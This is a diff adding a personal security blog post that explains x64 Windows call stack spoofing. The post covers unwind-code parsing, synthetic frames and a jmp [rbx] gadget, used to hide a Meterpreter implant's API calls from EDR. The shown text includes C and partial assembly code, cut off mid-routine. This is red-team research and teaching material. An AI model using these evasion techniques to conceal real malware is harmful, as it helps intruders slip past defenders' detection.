@@ -1,0 +1,1221 @@
+<html lang="en"><!-- Beautiful Jekyll 5.0.0 | Copyright Dean Attali 2020 --><head>
+  <meta name="google-site-verification" content="-Ld0YSINeh6fcZENkbjvfRTWu43ep4-wNFIpOI_Mbg4">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  
+
+  
+
+  <title>An Introduction into Stack Spoofing</title>
+
+  
+  <meta name="author" content="Dylan Tran">
+  
+
+  <meta name="description" content="And losing my sanity against Elastic">
+
+  
+
+  
+
+  
+  <link rel="alternate" type="application/rss+xml" title="Nigerald's blog" href="https://dtsec.us/feed.xml">
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+    
+      
+  <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+
+
+    
+      
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.min.css">
+
+
+    
+      
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic">
+
+
+    
+      
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800">
+
+
+    
+  
+
+  
+    
+      <link rel="stylesheet" href="/assets/css/bootstrap-social.css">
+    
+      <link rel="stylesheet" href="/assets/css/beautifuljekyll.css">
+    
+  
+
+  
+
+  
+  
+  
+
+  
+
+  
+  <meta property="og:site_name" content="Nigerald's blog">
+  <meta property="og:title" content="An Introduction into Stack Spoofing">
+  <meta property="og:description" content="And losing my sanity against Elastic">
+
+  
+  <meta property="og:image" content="https://dtsec.us/assets/img/Spoof_Thumb.png">
+  
+
+  
+  <meta property="og:type" content="article">
+  <meta property="og:article:author" content="Dylan Tran">
+  <meta property="og:article:published_time" content="2023-09-15T00:00:00-04:00">
+  <meta property="og:url" content="https://dtsec.us/2023-09-15-StackSpoofin/">
+  <link rel="canonical" href="https://dtsec.us/2023-09-15-StackSpoofin/">
+  
+
+  
+  <meta name="twitter:card" content="summary_large_image">
+  
+  <meta name="twitter:site" content="@d_tranman">
+  <meta name="twitter:creator" content="@d_tranman">
+
+  <meta property="twitter:title" content="An Introduction into Stack Spoofing">
+  <meta property="twitter:description" content="And losing my sanity against Elastic">
+
+  
+  <meta name="twitter:image" content="https://dtsec.us/assets/img/Spoof_Thumb.png">
+  
+
+  
+
+
+  
+
+  
+
+</head>
+
+
+<body>
+  <style>
+    .container-md {max-width: 100%;}
+  </style>
+  
+
+
+  <nav class="navbar navbar-expand-xl fixed-top navbar-custom top-nav-regular navbar-dark"><a class="navbar-brand" href="https://dtsec.us/">Nigerald's blog</a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false" aria-label="Toggle navigation">
+    <span class="navbar-toggler-icon"></span>
+  </button>
+
+  <div class="collapse navbar-collapse" id="main-navbar">
+    <ul class="navbar-nav ml-auto">
+          <li class="nav-item">
+            <a class="nav-link" href="/aboutme">About Me</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="https://docs.google.com/document/d/1CGqrblk3lIXdgdXBhT14ENHuo2tcoVux/edit?usp=sharing&amp;ouid=110900582475326123109&amp;rtpof=true&amp;sd=true">Resume</a>
+          </li>
+          <li class="nav-item dropdown">
+            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Posts by Category</a>
+            <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                  <a class="dropdown-item" href="https://dtsec.us/htb">HackTheBox</a>
+            </div>
+          </li>
+        
+        <li class="nav-item">
+          <a class="nav-link" id="nav-search-link" href="#" title="Search">
+            <span id="nav-search-icon" class="fa fa-search"></span>
+            <span id="nav-search-text">Search</span>
+          </a>
+        </li></ul>
+  </div>
+
+  
+
+  
+    <div class="avatar-container">
+      <div class="avatar-img-border">
+        <a href="https://dtsec.us/">
+          <img alt="Navigation bar avatar" class="avatar-img" src="/assets/img/avatar-icon.png">
+        </a>
+      </div>
+    </div>
+  
+
+</nav>
+
+
+
+<div id="beautifuljekyll-search-overlay">
+
+  <div id="nav-search-exit" title="Exit search">✕</div>
+  <input type="text" id="nav-search-input" placeholder="Search">
+  <ul id="search-results-container"></ul>
+  
+  <script src="https://unpkg.com/simple-jekyll-search@latest/dest/simple-jekyll-search.min.js"></script>
+  <script>
+    var searchjson = '[ \
+       \
+        { \
+          "title"    : "Module Stomping", \
+          "category" : "EvasionWindows", \
+          "url"      : "/2023-11-04-ModuleStompin/", \
+          "date"     : "November  4, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "An Introduction into Stack Spoofing", \
+          "category" : "PentestingEvasionWindows", \
+          "url"      : "/2023-09-15-StackSpoofin/", \
+          "date"     : "September 15, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "An Introduction into Sleep Obfuscation", \
+          "category" : "PentestingEvasionWindows", \
+          "url"      : "/2023-04-24-Sleep/", \
+          "date"     : "April 24, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Abusing JIT compilation with Indirect Syscalls", \
+          "category" : "PentestingEvasionWindows", \
+          "url"      : "/2022-10-02-NoGate2/", \
+          "date"     : "October  2, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "CRTO Review", \
+          "category" : "PentestingEvasionWindows", \
+          "url"      : "/2022-09-21-CRTO/", \
+          "date"     : "September 21, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "SharpHellsGate with no Gate and weird .NET memory stuff", \
+          "category" : "PentestingEvasionWindows", \
+          "url"      : "/2022-08-14-NoGate/", \
+          "date"     : "August 14, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Deploying .NET in memory with Dinvoke", \
+          "category" : "PentestingEvasionWindows", \
+          "url"      : "/2022-06-26-Donut_2/", \
+          "date"     : "June 26, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Deploying .NET in memory with Donut", \
+          "category" : "PentestingEvasionWindows", \
+          "url"      : "/2022-05-12-Donut_1/", \
+          "date"     : "May 12, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Sink", \
+          "category" : "CloudLinuxPentestingCVE", \
+          "url"      : "/2022-05-06-Sink/", \
+          "date"     : "May  6, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Multimaster", \
+          "category" : "Active DirectoryWindowsPentestingCVESQLi", \
+          "url"      : "/2022-04-22-Multimaster/", \
+          "date"     : "April 22, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Sizzle", \
+          "category" : "Active DirectoryWindowsPentestingClient-Side", \
+          "url"      : "/2022-04-20-Sizzle/", \
+          "date"     : "April 20, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "The OSCP Odyssey", \
+          "category" : "Pentesting", \
+          "url"      : "/2022-04-14-OSCP/", \
+          "date"     : "April 14, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Firewalling with Iptables", \
+          "category" : "LinuxFirewallNetworking", \
+          "url"      : "/2022-03-28-iptables/", \
+          "date"     : "March 28, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Bankrobber", \
+          "category" : "XSSClient-SideSQLiBuffer OverflowWindowsPentesting", \
+          "url"      : "/2021-12-26-Bankrobber/", \
+          "date"     : "December 26, 2021" \
+        }, \
+       \
+        { \
+          "title"    : "Worker", \
+          "category" : "DevOpsWindowsPentesting", \
+          "url"      : "/2021-12-07-Worker/", \
+          "date"     : "December  7, 2021" \
+        }, \
+       \
+        { \
+          "title"    : "Blackfield", \
+          "category" : "Active DirectoryWindowsPentesting", \
+          "url"      : "/2021-12-06-Blackfield/", \
+          "date"     : "December  6, 2021" \
+        }, \
+       \
+        { \
+          "title"    : "Resolute", \
+          "category" : "Active DirectoryWindowsPentesting", \
+          "url"      : "/2021-12-05-Resolute/", \
+          "date"     : "December  5, 2021" \
+        }, \
+       \
+        { \
+          "title"    : "Spider", \
+          "category" : "XXESQLiSSTILinuxPentesting", \
+          "url"      : "/2021-11-01-Spider/", \
+          "date"     : "November  1, 2021" \
+        }, \
+       \
+        { \
+          "title"    : "My First Swift Workshop", \
+          "category" : "SWIFT", \
+          "url"      : "/2021-10-16-My-First-Swift-Workshop/", \
+          "date"     : "October 16, 2021" \
+        }, \
+       \
+        { \
+          "title"    : "Lame", \
+          "category" : "LinuxCVEPentesting", \
+          "url"      : "/2021-09-30-Lame/", \
+          "date"     : "September 30, 2021" \
+        }, \
+       \
+        { \
+          "title"    : "The CCDC and CPTC Bootcamp", \
+          "category" : "CPTCCCDCSWIFT", \
+          "url"      : "/2021-09-06-CPTC-CCDC-Bootcamp/", \
+          "date"     : "September  6, 2021" \
+        }, \
+       \
+        { \
+          "title"    : "Love", \
+          "category" : "WindowsCVEPentesting", \
+          "url"      : "/2021-09-03-Love/", \
+          "date"     : "September  3, 2021" \
+        }, \
+       \
+       \
+        { \
+          "title"    : "HackThebox Completion", \
+          "category" : "page", \
+          "url"      : "/HackTheBoxbackup/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "", \
+          "category" : "page", \
+          "url"      : "/aboutme/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "", \
+          "category" : "page", \
+          "url"      : "/goneaboutme/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "HackTheBox Writeups", \
+          "category" : "page", \
+          "url"      : "/htb/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Nigerald&#39;s Blog", \
+          "category" : "page", \
+          "url"      : "/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Tag Index", \
+          "category" : "page", \
+          "url"      : "/tags/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "testing wiki format", \
+          "category" : "page", \
+          "url"      : "/test/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Nigerald&#39;s Blog", \
+          "category" : "page", \
+          "url"      : "/page2/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Nigerald&#39;s Blog", \
+          "category" : "page", \
+          "url"      : "/page3/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Nigerald&#39;s Blog", \
+          "category" : "page", \
+          "url"      : "/page4/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Nigerald&#39;s Blog", \
+          "category" : "page", \
+          "url"      : "/page5/", \
+          "date"     : "January 1, 1970" \
+        } \
+       \
+    ]';
+    searchjson = JSON.parse(searchjson);
+
+    var sjs = SimpleJekyllSearch({
+      searchInput: document.getElementById('nav-search-input'),
+      resultsContainer: document.getElementById('search-results-container'),
+      json: searchjson
+    });
+  </script>
+</div>
+
+
+
+
+
+  <!-- TODO this file has become a mess, refactor it -->
+
+
+
+
+
+
+
+<header class="header-section ">
+
+<div class="intro-header no-img">
+  <div class="container-md">
+    <div class="row">
+      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
+        <div class="post-heading">
+          <h1>An Introduction into Stack Spoofing</h1>
+          
+            
+              <h2 class="post-subheading">And losing my sanity against Elastic</h2>
+            
+          
+
+          
+            <span class="post-meta">Posted on September 15, 2023</span>
+            
+            
+              <!--- "ReadTime on GitHub Jekyll" (c) 2020 Ruby Griffith Ramirez, MIT License -->
+
+
+
+
+
+
+  
+  <span class="post-meta"><span class="d-none d-md-inline middot">·</span> 20 minute read</span>
+
+
+            
+          
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+</header>
+
+
+
+
+
+<div class=" container-md ">
+  <div class="row">
+    <div class=" col-xl-8 offset-xl-2 col-lg-10 offset-lg-1 ">
+
+      
+
+      
+
+      <article role="main" class="blog-post">
+        <p><img src="../assets/img/Spoof_Thumb.png" height="50%" width="50%" class="mx-auto d-block" unselectable="on"><br>
+Stack spoofing is a really cool malware technique that isn’t new, but has been receving some more attention recently. The goal of this post is to introduce readers to the concept and dive into two implementations. This post will focus only on call stack spoofing in x64 Windows with “active” spoofing techniques.</p>
+
+<h1 id="preface">Preface</h1>
+<p>None of the work here is novel. The majority of the stack spoofing research that I will be describing was done by <a href="https://twitter.com/klezvirus">Klezvirus</a>, <a href="https://twitter.com/trickster012">trickster012</a>, <a href="https://twitter.com/waldoirc">waldo-irc</a>, and <a href="https://twitter.com/namaszo">namaszo</a>. Massive thanks to them for providing the foundation for me to dig into such a cool topic.</p>
+
+<p>During my internship at X-Force Red I got to work with <a href="https://twitter.com/0xboku">0xboku</a> in researching the work above. Some of that work got to be integrated with <a href="https://github.com/boku7/BokuLoader">BokuLoader</a>, which was really awesome. Without Bobby’s help I wouldn’t have been able to understand these techniques as much, so massive thanks to him for sticking through several hour calls with my dumb questions.</p>
+
+<p>Lastly, I am not an expert on this subject, this post is meant to just share what I understand with others trying to cook funny software.</p>
+
+<h1 id="introduction">Introduction</h1>
+<p>EDR have more capabilities beyond inline hooking. It is possible for them to utilize the call stack of a function call to determine whether a function is malicious or not. <a href="https://www.elastic.co/security-labs/upping-the-ante-detecting-in-memory-threats-with-kernel-call-stacks">Elastic has demonstrated this capability</a> and I am guessing this call stack telemetry is obtained via kernel callbacks registered for process and thread creation events, and probably more.</p>
+
+<details style="background-color: #000000; color: #FFFFFF; border-left: 5px solid #00FF00; border-radius: 10px; padding: 10px;">
+  <summary>Call stack?</summary>
+  <p>Every thread in a process has its own call stack. When a function is called, a frame is created for it; this frame is a space for it store some data for that function, like local variables. Right below the base of the frame contains a return address; the location of the frame's caller. This way, when the function finishes execution, it can return to its caller.
+  </p>
+</details>
+
+<p>Using a debugger, we can place breakpoints on some function calls and view our call stack. When our implant (in my case, meterpreter), makes a function call (<code class="language-plaintext highlighter-rouge">gethostbyname</code> in the screenshot below), we can see that the call stack points back to its location in memory.</p>
+
+<p><img src="../assets/img/Spoof_3.png" height="75%" width="75%" class="mx-auto d-block" unselectable="on"></p>
+
+<p>A little note: the most recent caller is higher in the stack (lower number), each entry you go down is the above entry’s caller. The additional addresses beyond the meterpreter return address are “leaked” stack values; when unbacked memory is encountered by a walk, it assumes the stack frame is just of size 8, causing it to just dump stack values until it encounters a 0.</p>
+
+<details style="background-color: #000000; color: #FFFFFF; border-left: 5px solid #00FF00; border-radius: 10px; padding: 10px;">
+  <summary>The size and the allocation don't line up!</summary>
+  <p>Yeah lol, that's just a consequence of my janky meterpreter reflective loader that cannot free itself due to IAT hooks that are defined within the loader. gethostbyname was called by meterpreter.
+  </p>
+</details>
+
+<p>From here, EDR could:</p>
+<ul>
+  <li>Kill our implant because that address is RX (Read-Executable) memory unbacked by a file on disk</li>
+  <li>Run a memory scan and kill our implant because it will probably get flagged</li>
+  <li>Flag our process to warrant more investigation by an IR operator</li>
+  <li>Some other voodoo</li>
+</ul>
+
+<p>This is not ideal. So how can we address this? We can try spoofing our callstack; making it less suspicious by attempting to hide the source of our call. There are multiple ways to achieve this; this blog post will not cover all of them.</p>
+
+<h1 id="active-spoofing-vs-passive-spoofing">Active Spoofing vs Passive Spoofing</h1>
+<p>The techniques I will introducing fall under the “active” category; that is, they allow for the spoofing of any function being called. See the following projects:</p>
+<ul>
+  <li><a href="https://github.com/WithSecureLabs/CallStackSpoofer">VulcanRaven</a></li>
+  <li><a href="https://github.com/kyleavery/AceLdr/blob/main/src/asm/spoof.asm">AceLdr</a>’s ret addr spoofing</li>
+</ul>
+
+<p>Passive spoofing is something I sort of went over in my previous blog post and it is a type of spoofing that can only occur when the implant is sleeping. See the following projects:</p>
+<ul>
+  <li><a href="https://github.com/mgeeky/ThreadStackSpoofer">ThreadStackSpoofer</a></li>
+  <li><a href="https://github.com/Cobalt-Strike/CallStackMasker">CallStackMasker</a></li>
+  <li><a href="https://github.com/Kudaes/Unwinder">Unwinder</a></li>
+  <li><a href="https://github.com/realoriginal/titanldr-ng/blob/master/Obf.c">TitanLdr</a>’s sleep technique. This was also implemented in AceLdr</li>
+</ul>
+
+<p>The active spoofing techniques I am covering have been done by the <a href="https://github.com/klezVirus/SilentMoonwalk/tree/master">SilentMoonwalk</a> project.</p>
+
+<h1 id="x64-call-stack-primer">x64 Call Stack Primer</h1>
+<p>Unlike x86, only the RSP is necessary for keeping track of stack frames. Take the following code</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  void FuncC()
+  {
+      return;
+  }
+  void FuncB(int a, int b, int c, int d)
+  {
+      FuncC();
+      return;
+  }
+  int FuncA(int a, int b, int br, int uh)
+  {
+      int c = a;
+      int d = b;
+      FuncB(1, 1, 1, 1);
+      return 5;
+  }
+  void main()
+  {
+      FuncA(1, 2, 3, 4);
+  }
+</code></pre></div></div>
+<p>The contents of the call stack when FuncB() is called is below on the left. The Process Hacker stack walk view is on the right.
+<br>
+<img src="../assets/img/Spoof_1.png" height="75%" width="75%" class="mx-auto d-block" unselectable="on"></p>
+
+<p>The space between the return addresses (the “Return to X”) is what I will refer to as the “stack size” of a function. Understanding how to calculate this stack size will be important for trying to spoof stacks as it is a common attribute utilized when unwinding the stack.</p>
+
+<h1 id="the-pdata-section-and-unwind-codes">The .pdata section and unwind codes</h1>
+<p>The .pdata section is a PE section which includes information to assist with exception handling. More specifically, it is an array of <code class="language-plaintext highlighter-rouge">RUNTIME_FUNCTION</code>s.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>typedef struct _IMAGE_RUNTIME_FUNCTION_ENTRY {
+  DWORD BeginAddress;
+  DWORD EndAddress;
+  union {
+    DWORD UnwindInfoAddress;
+    DWORD UnwindData;
+  } DUMMYUNIONNAME;
+} RUNTIME_FUNCTION
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">BeginAddress</code> and <code class="language-plaintext highlighter-rouge">EndAddress</code> are offsets to the base of the PE. The actual code for the function this <code class="language-plaintext highlighter-rouge">RUNTIME_FUNCTION</code> belongs to is between those addresses. The union contains the interesting bit; an offset to the <code class="language-plaintext highlighter-rouge">UNWIND_INFO</code> struct.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>typedef struct _UNWIND_INFO {
+    BYTE Version : 3;
+    BYTE Flags : 5;
+    BYTE SizeOfProlog;
+    BYTE CountOfCodes;
+    BYTE FrameRegister : 4;
+    BYTE FrameOffset : 4;
+    UNWIND_CODE UnwindCode[1];
+} UNWIND_INFO, * PUNWIND_INFO;
+</code></pre></div></div>
+
+<p>This <code class="language-plaintext highlighter-rouge">UNWIND_INFO</code> contains an array of <code class="language-plaintext highlighter-rouge">UNWIND_CODE</code>s. We can iterate through these to calculate the stack size of the function.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>typedef union _UNWIND_CODE {
+    struct {
+        BYTE CodeOffset;
+        BYTE UnwindOp : 4;
+        BYTE OpInfo : 4;
+    };
+    USHORT FrameOffset;
+} UNWIND_CODE, * PUNWIND_CODE;
+</code></pre></div></div>
+
+<p>There are different code types, with some affecting the stack size of a function by varying amounts.</p>
+
+<h1 id="creating-our-own-frames">Creating our own frames</h1>
+
+<p>With the information we have so far, we can try to  create “synthetic” frames via the following steps.</p>
+
+<ol>
+  <li>Decrement <code class="language-plaintext highlighter-rouge">rsp</code> by the stack size</li>
+  <li>Set <code class="language-plaintext highlighter-rouge">[rsp]</code> to the a return address</li>
+  <li>Repeat at if we want to create another frame</li>
+</ol>
+
+<div style="display: flex; justify-content: center; align-items: center;" height="100%">
+  <iframe width="100%" height="630px" src="https://www.youtube-nocookie.com/embed/9iIHdtCogRQ" frameborder="0" allowfullscreen=""></iframe>
+</div>
+
+<h1 id="active-spoofing-synthetic-frames">Active Spoofing: Synthetic Frames</h1>
+<p>Note: This method was done by both <a href="https://github.com/WithSecureLabs/CallStackSpoofer">VulcanRaven</a> and <a href="https://github.com/klezVirus/SilentMoonwalk">SilentMoonwalk</a> and is essentially an extension of <a href="https://www.unknowncheats.me/forum/anti-cheat-bypass/268039-x64-return-address-spoofing-source-explanation.html">namaszo’s return address spoofing</a>, implemented by <a href="https://github.com/kyleavery/AceLdr">AceLdr</a> by Kyle Avery.</p>
+
+<details style="background-color: #000000; color: #FFFFFF; border-left: 5px solid #00FF00; border-radius: 10px; padding: 10px;">
+  <summary>More details about the technique here</summary>
+  <p>The technique, originally posted in 2018, would spoof the stack by replacing the return address to a <code>jmp [rbx]</code> gadget within a signed dll. This is done via the following steps:
+    </p><ol>
+      <li>Store the original return address in a struct</li>
+      <li>Overwrite the return address with the address of the struct</li>
+      <li>Store a handler address at the base of the struct</li>
+      <li>Store the original rbx in the struct</li>
+      <li>Set the rbx to the address of the struct.</li>
+      <li>Jump to the function we wish to call</li>
+    </ol>
+  When the call returns, it returns to the the gadget, which causes execution flow the jump to address in the rbx; the struct's address, but since the first member is the handler's  address, it jumps there. The handler restores the original rbx and jumps back to the original return address. 
+  <p></p>
+</details>
+
+<p>Putting everything together, this is what we need to accomplish:</p>
+<ol>
+  <li>Locate the <code class="language-plaintext highlighter-rouge">RUNTIME_FUNCTION</code> of the frames we wish to craft within their modules’ .pdata section</li>
+  <li>Parse the <code class="language-plaintext highlighter-rouge">UNWIND_CODE</code>s to calculate their stack sizes</li>
+  <li>Push a 0</li>
+  <li>Create our fake frames</li>
+  <li>Locate a <code class="language-plaintext highlighter-rouge">jmp [rbx]</code> gadget and create a frame for that</li>
+  <li>Jump to the function we wish to call</li>
+</ol>
+
+<p>The strategy I implemented in my first <a href="https://github.com/susMdT/LoudSunRun">POC</a> pushes a 0 and creates two fake “origin” frames; these were <code class="language-plaintext highlighter-rouge">ntdll.RtlUserThreadStart + 0x21</code> and <code class="language-plaintext highlighter-rouge">kernel32.BaseThreadInitThunk+0x14</code> as they were the most common start frames on the system I was using. The initial 0 being pushed will cause stack walks to prematurely end their walks, so only our synthetic frames and the frames generated after our function call are shown.</p>
+
+<details style="background-color: #000000; color: #FFFFFF; border-left: 5px solid #00FF00; border-radius: 10px; padding: 10px;">
+  <summary>More details about LoudSunRun here</summary>
+  <p>I wanted to recreate the synthetic frames technique from SilentMoonWalk, since the original codebase was kinda large and I wanted to understand the technique more. The main differences between my implementation and SilentMoonWalk's synthetic one is a smaller code base, indirect syscall support, and multiple argument support (via relocating stack arguments to the call site).
+  </p>
+</details>
+
+<p>On the left is the stack we’re trying to create, and on the right is the execution flow.</p>
+
+<p><img src="../assets/img/Spoof_4.png" height="75%" width="75%" class="mx-auto d-block" unselectable="on"></p>
+
+<p>Spoofing <code class="language-plaintext highlighter-rouge">NtAllocateVirtualMemory</code> causes the stack to appear like below.</p>
+
+<p><img src="https://i.imgur.com/aHWnX4S.png" height="75%" width="75%" class="mx-auto d-block" unselectable="on"></p>
+
+<p>We can see the initial 0 pushed caused the walk to be stopped at our synthetic <code class="language-plaintext highlighter-rouge">RtlUserThreadStart</code> frame; our function call no longer traces back to meterpreter.</p>
+
+<p>The code to the butchered version of <a href="https://github.com/Cracked5pider/KaynLdr/">KaynLdr</a> I used to replace meterpreter’s reflective loader is available <a href="https://github.com/susMdT/msf_udrl/tree/main">here</a>. This was so I could integrate this implementation of stack spoofing into meterpreter via IAT hooking. It does not bypass defender lol.</p>
+
+<details style="background-color: #000000; color: #FFFFFF; border-left: 5px solid #00FF00; border-radius: 10px; padding: 10px;">
+  <summary>More details about the reflective loader here</summary>
+  <p>I wanted to try writing a reflective loader, so I took 5pider's KaynLdr and modified it a bit. I saw IAT hooking mentioned by Bobby Cooke's reflective loader post, and saw the opportunity to try to implement stack spoofing via IAT hooks. The difference between the loader and LoudSunRun is that the loader is able to spoof calls without any WinAPIs being used as function address resolution and the <code>RUNTIME_FUNCTION</code> resolution is done manually.
+  </p>
+</details>
+
+<details style="background-color: #000000; color: #FFFFFF; border-left: 5px solid #00FF00; border-radius: 10px; padding: 10px;">
+  <summary>Can I see the relevant code?</summary>
+  Sure
+  <details style="background-color: #000000; color: #FFFFFF; border-left: 5px solid #00FF00; border-radius: 10px; padding: 10px;">
+    <summary>Runtime Function Finder</summary>
+      <p>This function finds the <code>RUNTIME_FUNCTION</code> of an addrew via iterated through all the modules in the PEB and checks if they are <code>.dll</code>s. Afterwards it gets the .pdata address range of the module and iterates through all of the <code>RUNTIME_FUNCTION</code>s of the module, checking if the requested address lies within any of the <code>RUNTIME_FUNCTION</code>s. If not, the next module is checked and the loop continues.
+      </p>
+      <pre>        <code style="color: white">
+PRUNTIME_FUNCTION GetRuntimeFunction( PVOID Address, PVOID* ImageBase )
+{
+    // Walk the PEB Modules, try to find the module that function falls within
+    PLDR_DATA_TABLE_ENTRY pModule      = ( PLDR_DATA_TABLE_ENTRY ) ( ( PPEB ) PPEB_PTR )-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink;
+	PLDR_DATA_TABLE_ENTRY pFirstModule = pModule;
+	do
+	{
+
+        // Get Size of DLL;
+        PVOID                 Base          = NULL;
+        PIMAGE_NT_HEADERS     NtHeaders     = NULL;
+        PIMAGE_SECTION_HEADER SecHeader     = NULL;
+        DWORD                 TextSize      = NULL;
+        PVOID                 LowerBound    = NULL;
+        PVOID                 UpperBound    = NULL;
+        
+        Base            = pModule-&gt;Reserved2[ 0 ];
+        if ( Base )
+        {
+            if ( *( PWORD )( Base ) == 0x5A4D )
+            {
+                
+                NtHeaders		= (PVOID) ( Base + ( ( PIMAGE_DOS_HEADER ) Base )-&gt;e_lfanew );
+                
+                if ( *( PWORD )NtHeaders == 0x4550 )
+                {
+                    if ( NtHeaders-&gt;FileHeader.Characteristics &amp; 0x2000 )
+                    {
+
+                        SecHeader 		= IMAGE_FIRST_SECTION( NtHeaders );
+
+                        for ( int i = 0; i &lt; NtHeaders-&gt;FileHeader.NumberOfSections; i++ )
+                        {
+                            if ( HashString( SecHeader[ i ].Name, 0 ) ==  H_PDATA )
+                            {
+                                LowerBound      = (PBYTE) Base + SecHeader[ i ].VirtualAddress;
+                                UpperBound      = (PBYTE) LowerBound + SecHeader[ i ].Misc.VirtualSize;
+                            }
+                        }
+
+                        if ( LowerBound &amp;&amp; UpperBound )
+                        {
+                            // Let's find the PRUNTIME_FUNCTION in the pdata
+                            PVOID RelativeAddress  =  Address - Base;
+
+                            for ( PRUNTIME_FUNCTION p = LowerBound; p &lt; UpperBound ; p++ )
+                            {
+                                if ( RelativeAddress &gt;= p-&gt;BeginAddress &amp;&amp; RelativeAddress &lt;= p-&gt;EndAddress )
+                                {
+                                    *ImageBase = Base;
+                                    return p;
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        pModule = ( PLDR_DATA_TABLE_ENTRY ) pModule-&gt;Reserved1[ 0 ];
+	
+    } while ( pModule &amp;&amp; pModule != pFirstModule );
+
+    return NULL;
+}
+        </code>
+      </pre>
+  </details>
+  <details style="background-color: #000000; color: #FFFFFF; border-left: 5px solid #00FF00; border-radius: 10px; padding: 10px;">
+    <summary>Spoof Struct</summary>
+      <p>This struct contains a lot of information necessary for the assembly code to set up the frames and perform the synthetic spoofing properly. AceLdr/Namszo's return address patching used a struct, and since this technique just builds upon that, I just expanded the struct.
+      </p>
+      <pre>        <code style="color: white">
+typedef struct
+{
+    PVOID       Fixup;             // 0
+    PVOID       OG_retaddr;        // 8
+    PVOID       rbx;               // 16
+    PVOID       rdi;               // 24
+    PVOID       BTIT_ss;           // 32
+    PVOID       BTIT_retaddr;      // 40
+    PVOID       Gadget_ss;         // 48
+    PVOID       RUTS_ss;           // 56
+    PVOID       RUTS_retaddr;      // 64
+    PVOID       ssn;               // 72  
+    PVOID       trampoline;        // 80
+    PVOID       rsi;               // 88
+    PVOID       r12;               // 96
+    PVOID       r13;               // 104
+    PVOID       r14;               // 112
+    PVOID       r15;               // 120
+} PRM, * PPRM;
+        </code>
+      </pre>
+      <p> <code>_retaddr</code> is the return address we want on to show up on the frame. <code>_ss</code> is the stack size of the respective address we're creating a frame work. The first member is <code>Fixup</code> so we can just store this struct address in the <code>rbx</code> and our gadget will jump to the handler. There are some nonvolatile registers stored here for restoration at the handler (<code>Fixup</code>). And there's a <code>ssn</code> in case the function we wish to spoof is a syscall. This code already jumps directly to the func we want to spoof, so syscall support was easy.
+      </p>
+  </details>
+  <details style="background-color: #000000; color: #FFFFFF; border-left: 5px solid #00FF00; border-radius: 10px; padding: 10px;">
+    <summary>Assembly to set up frames</summary>
+      <p>This is a decent size chunk of assembly and uses a lot of offsets based on the previous struct. It's painful to read lol. The calling convention for Spoof is <code>Spoof(param1, param2, param3, param4, &amp;SpoofStruct, AddrOfFunc, NumofStackArgs, argN)</code>. The first 4 args are passed via <code>rcx rdx r8 r9</code> so those are easy. Argument 5 is the spoof struct, 6 is the address of the function we wish to execute (a syscall instruction works here, too), and 7 is the number of arguments passed onto the stack. Since any argument beyond the first 4 are passed via the stack, I wanted to notify <code>Spoof</code> if there was more than 4 arguments, and how many more there were. This is important because aside from just setting up the frames and jumping to our function, <code>Spoof</code> is going to relocate our stack arguments onto the new call site. This makes it such that you don't need to pass arguments via struct members. </p>
+      <pre>        <code style="color: white">
+Spoof: 
+
+    pop    r12                         ; Real return address in r12
+    
+    mov    r10, rdi                    ; Store OG rdi in r10
+    mov    r11, rsi                    ; Store OG rsi in r11
+
+    mov    rdi, [rsp + 32]             ; Storing struct in the rdi
+    mov    rsi, [rsp + 40]             ; Storing function to call
+
+    ; ---------------------------------------------------------------------
+    ; Storing our original registers
